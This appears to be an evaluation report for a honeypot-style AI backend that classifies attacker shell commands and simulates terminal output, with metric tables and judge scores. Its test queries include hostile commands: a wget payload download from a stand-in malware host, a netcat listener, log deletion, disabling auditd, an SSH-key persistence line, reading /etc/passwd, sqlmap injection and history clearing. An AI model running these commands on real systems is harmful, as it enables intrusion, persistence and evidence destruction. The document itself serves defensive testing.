# Xynera AI Backend Evaluation Report

This report summarizes the performance evaluation of the Xynera AI Backend across Classification Accuracy, Retrieval Precision, and Response Quality.

- **Timestamp**: 2026-06-24 13:54:28
- **Total Commands Tested**: 53
- **Semantic Retrieval Queries Tested**: 5
- **Total Generations Evaluated**: 12

---

## 📊 Summary of Metrics

| Metric Category | Metric Name | Value | Description |
| :--- | :--- | :--- | :--- |
| **Classification** | Overall Accuracy | `100.00%` | Correct classification of command threat classes |
| **Retrieval** | Overall Accuracy | `86.21%` | Retrieval of correct KB doc or `None` if out-of-scope |
| **Response Quality** | Avg Latency | `11.37s` | Time taken to generate simulation output |
| | No Markdown Code Blocks | `100.00%` | % of outputs without forbidden ``` wrapper |
| | No Conversational Fluff | `100.00%` | % of outputs free of apologies/preambles |
| | No Prompt Leakage | `100.00%` | % of outputs without unstripped bash prompts |
| | Parameter Adaptation | `100.00%` | % of outputs successfully substituting command args |
| **LLM-as-a-Judge** | Avg Realism | `5.00 / 10` | Realism score from Llama-3.1-8b evaluator |
| | Avg Adherence | `6.92 / 10` | simulation rules adherence (no meta-text/conversational text) |
| | Avg Consistency | `7.42 / 10` | Logical alignment with flags/inputs |

---

## 🔍 Detail: Classification Performance

### Class-Wise Metrics
| Class Name | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| Defense Evasion | 100.00% | 100.00% | 1.00 |
| Malware Download Attempt | 100.00% | 100.00% | 1.00 |
| Malware Execution Attempt | 100.00% | 100.00% | 1.00 |
| Permission Manipulation | 100.00% | 100.00% | 1.00 |
| Persistence Creation | 100.00% | 100.00% | 1.00 |
| Privilege Escalation Attempt | 100.00% | 100.00% | 1.00 |
| Reconnaissance | 100.00% | 100.00% | 1.00 |
| Reverse Shell Attempt | 100.00% | 100.00% | 1.00 |
| SQL Injection Attempt | 100.00% | 100.00% | 1.00 |
| Unknown | 100.00% | 100.00% | 1.00 |

### Classification Failures & Misclassifications
*None! The command classifier performed perfectly.*

---

## 🔍 Detail: Retrieval Performance

### Document-Wise/Class-Wise Metrics
| Target KB Command | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| None | 88.89% | 53.33% | 0.67 |
| cat /var/www/internal/clients.json | 0.00% | 0.00% | 0.00 |
| chmod | 100.00% | 100.00% | 1.00 |
| crontab | 100.00% | 100.00% | 1.00 |
| curl | 100.00% | 100.00% | 1.00 |
| df | 100.00% | 100.00% | 1.00 |
| dmesg | 100.00% | 100.00% | 1.00 |
| docker | 100.00% | 100.00% | 1.00 |
| env | 100.00% | 100.00% | 1.00 |
| find | 100.00% | 100.00% | 1.00 |
| free | 100.00% | 50.00% | 0.67 |
| grep | 100.00% | 100.00% | 1.00 |
| history | 100.00% | 100.00% | 1.00 |
| hostname | 100.00% | 100.00% | 1.00 |
| id | 50.00% | 100.00% | 0.67 |
| ifconfig | 100.00% | 100.00% | 1.00 |
| ip | 100.00% | 100.00% | 1.00 |
| iptables | 100.00% | 100.00% | 1.00 |
| last | 100.00% | 100.00% | 1.00 |
| ls | 100.00% | 100.00% | 1.00 |
| lsb_release | 100.00% | 100.00% | 1.00 |
| lscpu | 100.00% | 100.00% | 1.00 |
| nc | 100.00% | 100.00% | 1.00 |
| netcat | 100.00% | 100.00% | 1.00 |
| netstat | 100.00% | 100.00% | 1.00 |
| nmap | 100.00% | 100.00% | 1.00 |
| ping | 100.00% | 100.00% | 1.00 |
| ps | 100.00% | 100.00% | 1.00 |
| ss | 33.33% | 100.00% | 0.50 |
| systemctl | 100.00% | 100.00% | 1.00 |
| top | 50.00% | 100.00% | 0.67 |
| uname | 100.00% | 100.00% | 1.00 |
| uptime | 100.00% | 100.00% | 1.00 |
| w | 33.33% | 100.00% | 0.50 |
| wget | 100.00% | 100.00% | 1.00 |
| which | 100.00% | 100.00% | 1.00 |
| whoami | 100.00% | 100.00% | 1.00 |

### Retrieval Failures
| Query / Command | Expected KB Document | Actual Retrieved Document |
| :--- | :--- | :--- |
| `sqlmap -u "http://site.com/index.php?id=1" --dbs` | `None` | `id` |
| `rm -rf /var/log/nginx` | `None` | `cat /var/www/internal/clients.json` |
| `stop auditd` | `None` | `top` |
| `echo "ssh-rsa AAAAB..." >> ~/.ssh/authorized_keys` | `None` | `ss` |
| `dirtycow` | `None` | `w` |
| `pwd` | `None` | `w` |
| `cat /etc/passwd` | `None` | `ss` |
| `check RAM usage` | `free` | `None` |

---

## 🔍 Detail: Response Quality & Simulation Realism

### Sample Generation Log & Scores
| Command | Latency | Code Blocks | No Fluff | No Prompt | Adaptation | Realism | Adherence | Consistency | Judge Feedback |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| `nmap -sS -v 192.168.1.1` | 1.03s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic, with the only minor discrepancy being the word 'target' in the reference document being replaced with '192.168.1.1' in the generated output. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the flags, arguments, and IP address. |
| `wget http://malware.sh/payload.sh` | 0.88s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is almost identical to the reference output, with the only difference being the date. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the IP address and filename. |
| `chmod 777 /var/www/html/uploads` | 11.69s | ✅ | ✅ | ✅ | ✅ | 2 | 8 | 0 | The output is not realistic as the error message 'No such file or directory' is not the expected error for the chmod command. The expected error would be 'chmod: changing permissions of '/var/www/html/uploads': Permission denied' if the user doesn't have write permissions. The output is also missing the expected 'chmod' command output, which would be a success message indicating the permissions have been changed. |
| `nc -lvp 4444` | 18.14s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is mostly realistic, but it's missing the actual listening address and port information that would be displayed by the netcat command. The output is clean and doesn't contain any conversational fluff or explanations. The response is logically consistent with the command executed. |
| `history -c` | 9.40s | ✅ | ✅ | ✅ | ✅ | 2 | 2 | 1 | The output 'No command history.' is not realistic for the command 'history -c'. A real Linux terminal would clear the command history and not display any output. The AI also failed to adhere to the format by providing a sentence instead of a blank line or a message indicating that the history has been cleared. The response is also inconsistent with the command executed, as 'history -c' is supposed to clear the command history, not display a message. |
| `crontab -e` | 11.92s | ✅ | ✅ | ✅ | ✅ | 2 | 1 | 8 | The output is not realistic as it does not match the expected output of the 'crontab -e' command. The AI response contains a list of editors, which is not relevant to the command. The adherence score is low because the output contains a lot of unnecessary information and is not presented in a clean terminal format. The consistency score is high because the command executed is correctly identified as 'crontab -e', but the output is not relevant to the command. |
| `find / -perm -4000 -type f 2>/dev/null` | 19.68s | ✅ | ✅ | ✅ | ✅ | 6 | 8 | 9 | The output is mostly realistic, but the filenames and paths seem to be a mix of real and fictional examples. The AI did a good job avoiding conversational fluff and explanations, but the output could be more consistent with the command executed. The only issue is that the output contains a file with a .json extension, which is not typically a file that would be owned by the root user and have execute permissions (0400). |
| `ps aux` | 14.16s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it's missing the header line 'USER       PID %CPU %MEM COMMAND' which is present in the reference output. The AI response is clean and free of any conversational fluff or explanations, but it's missing the header line which slightly affects the realism score. The output is logically consistent with the command executed, 'ps aux', and the format matches the reference output. |
| `netstat -antp` | 7.47s | ✅ | ✅ | ✅ | ✅ | 2 | 1 | 4 | The output is not realistic as it contains multiple instances of the same UDP socket (0.0.0.0:68) with the same PID (1231/dhclient). This is unlikely to occur in a real Linux system. The AI also failed to adhere to terminal output conventions by not providing a clean, concise output without any explanations or code block tags. The consistency is partially met as the output does contain some real information about the system's network connections, but it is heavily distorted by the repeated UDP socket entries. |
| `ping -c 4 8.8.8.8` | 10.77s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 9 | The output is mostly realistic, but the TTL value (57) is lower than the typical TTL value for Google's DNS server (116). This suggests a minor inconsistency. The AI did a good job of avoiding conversational fluff and producing a clean terminal output. |
| `mkdir /tmp/test` | 17.97s | ✅ | ✅ | ✅ | ✅ | 2 | 8 | 9 | The output is not entirely realistic as it does not match the expected 'command not found' fallback. The AI should have mimicked the behavior of a Linux terminal when an unknown command is executed. The output is mostly clean, but it could be more precise. The consistency is high because the command executed was a valid mkdir command and the output does not contain any unrelated information. |
| `pwd` | 13.40s | ✅ | ✅ | ✅ | ✅ | 2 | 8 | 9 | The output is missing the expected system information and user session details that would be present in a real Linux terminal. The AI response only includes the expected directory path, but it lacks the system uptime, user session information, and other details that would be present in a real terminal. The adherence score is high because the AI avoided any conversational fluff or explanations, but it could be improved by including more details to make the output more realistic. |
